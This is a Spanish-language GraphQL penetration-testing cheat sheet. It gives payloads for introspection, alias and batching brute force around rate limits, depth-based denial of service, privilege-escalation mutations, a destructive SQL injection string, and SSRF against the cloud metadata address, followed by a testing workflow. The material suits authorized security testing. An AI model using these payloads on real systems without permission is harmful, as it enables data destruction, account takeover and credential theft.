# GraphQL Specialization

## Detección de endpoint
- `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`
- Headers: `Content-Type: application/json` con body `{"query": "..."}`

## Introspection abuse

Si está habilitado en producción → schema completo expuesto.
```graphql
{
  __schema {
    types { name fields { name args { name type { name } } } }
  }
}
```

Herramientas:
```bash
inql -t https://target.cl/graphql -o inql_out
graphqlmap -u https://target.cl/graphql --json
```

GraphQL Voyager para visualizar schema.

## Auth bypass

- Mutations sin auth check (frontend assume guard pero backend no valida).
- `__typename` introspection bypass.
- Aliases para evitar rate-limits:
```graphql
{
  a: login(user:"x", pass:"a")
  b: login(user:"x", pass:"b")
  c: login(user:"x", pass:"c")
}
```

## Batching abuse

Enviar array de queries en un solo request:
```json
[
  {"query": "{ user(id:1) { email } }"},
  {"query": "{ user(id:2) { email } }"},
  ...
]
```
Bypassea rate-limit por request.

## Depth attack (DoS)

```graphql
query {
  user { friends { friends { friends { friends { name } } } } }
}
```

Si no hay limit de depth → DoS.

## Field-level authorization

Probar mutations que solo deberían existir para admin:
```graphql
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: ADMIN) }
```

## NoSQL/SQL injection en argumentos

```graphql
{ user(filter: "1'; DROP TABLE users--") { id } }
```

## SSRF via GraphQL

```graphql
mutation { uploadFromURL(url: "http://169.254.169.254/latest/meta-data/") }
```

## Information disclosure

- Errors verbosos exponen schema/stack.
- `_debug` queries.
- Field suggestions cuando se escribe mal un nombre.

## Patrón operativo

1. Detectar endpoint.
2. Probar introspection.
3. Mapear queries/mutations.
4. Por cada mutation: probar sin auth, con auth low, con BOLA.
5. Probar batching y depth para DoS.
6. Buscar SSRF en args tipo URL.
